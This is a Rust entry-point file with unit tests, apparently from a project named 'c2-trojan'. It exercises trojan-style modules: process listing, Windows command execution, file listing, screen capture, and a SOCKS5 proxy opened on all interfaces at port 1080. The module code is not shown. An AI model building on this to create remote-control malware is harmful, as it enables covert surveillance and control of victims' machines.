mod command;
mod file_manager;
mod process_manager;
mod proxy;
mod screenshot;
mod utils;

use std::env;

fn main() {
    println!("--- Processes ---");
    let processes = process_manager::list_processes();
    println!("Found {} processes", processes.len());

    println!("\n--- Command Execution ---");
    let cmd_out = command::win_command("dir");
    let decoded = utils::auto_decode(&cmd_out);
    println!("Command output length: {}", decoded.len());

    println!("\n--- File Manager ---");
    if let Ok(files) = file_manager::list_files(".") {
        println!("Files in current dir: {}", files.len());
    }

    println!("\n--- Screenshot ---");
    screenshot::capture_primary_display();
    println!("Screenshot captured.");

    let args: Vec<String> = env::args().collect();
    if args.contains(&"--proxy".to_string()) {
        println!("\n--- Starting Proxy (Blocking) ---");
        proxy::start_pure_std_proxy("0.0.0.0:1080").unwrap();
    } else {
        println!("\n--- Proxy code included (Skip with --proxy to run) ---");
    }
}

#[cfg(test)]
mod tests {
    use crate::command;
    use crate::file_manager;
    use crate::process_manager;
    use crate::proxy;
    use crate::screenshot;

    #[test]
    fn test_win_command() {
        let output = command::win_command("dir");
        let decoded_output = crate::utils::auto_decode(&output);
        assert!(decoded_output.contains("目录"));
    }

    #[test]
    fn test_file_manager() {
        let files = file_manager::list_files("E:\\Develop\\Rust\\c2-trojan").unwrap();
        for file in &files {
            println!("{:?}", file);
        }
        assert!(!files.is_empty());
    }
    #[test]
    fn test_process_manager() {
        println!("{:?}", process_manager::list_processes())
    }
    #[test]
    fn test_socket5_proxy() {
        proxy::start_pure_std_proxy("0.0.0.0:1080").unwrap();
    }
    #[test]
    fn test_capture_primary_display() {
        screenshot::capture_primary_display();
    }
}
